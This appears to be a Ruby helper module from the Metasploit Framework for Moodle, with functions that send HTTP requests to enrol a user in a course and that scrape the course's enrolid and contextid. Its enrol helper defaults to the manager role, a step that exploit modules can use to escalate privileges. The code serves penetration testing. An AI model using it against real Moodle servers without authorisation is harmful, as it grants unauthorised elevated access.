# -*- coding: binary -*-

module Msf::Exploit::Remote::HTTP::Moodle::Course
  # performs a moodle course enrollment
  #
  # @param user_id [String] ID of the user to enrol
  # @param course_id [String] ID of the course to enrol in
  # @param enrol_id [String] ID of the enrolment
  # @param sess_key [String] session key
  # @param role [String] role to enrol as. 1 is manager, 5 is student
  # @return [Boolean] if the enrolment was successful or not
  def enrol(user_id, course_id, enrol_id, sess_key, role = '1')
    res = send_request_cgi({
      'uri' => moodle_enrol_ajax,
      'vars_get' => moodle_helper_enrol_get_data(user_id, course_id, enrol_id, sess_key, role),
      'keep_cookies' => true
    })
    return false unless res
    if res.body.include?('success')
      return true
    end

    return false
  end

  # obtains the enrolid from an enrolled course
  #
  # @param course_id [String] ID of the course
  # @return [String,nil] the enrolid for the course, nil otherwise
  def get_course_enrol_id(course_id)
    res = send_request_cgi({
      'uri' => moodle_user_home,
      'vars_get' => {
        'id' => course_id
      },
      'keep_cookies' => true
    })
    return nil unless res

    res.body =~ /name="enrolid" value="(.*?)"/
    Regexp.last_match(1)
  end

  # obtains the contextid from an enrolled course
  #
  # @param course_id [String] ID of the course
  # @return [String,nil] the contextid for the course, nil otherwise
  def get_course_context_id(course_id)
    res = send_request_cgi({
      'uri' => moodle_user_home,
      'vars_get' => {
        'id' => course_id
      },
      'keep_cookies' => true
    })
    return nil unless res

    res.body =~ /contextid=(\d*)"/
    Regexp.last_match(1)
  end
end
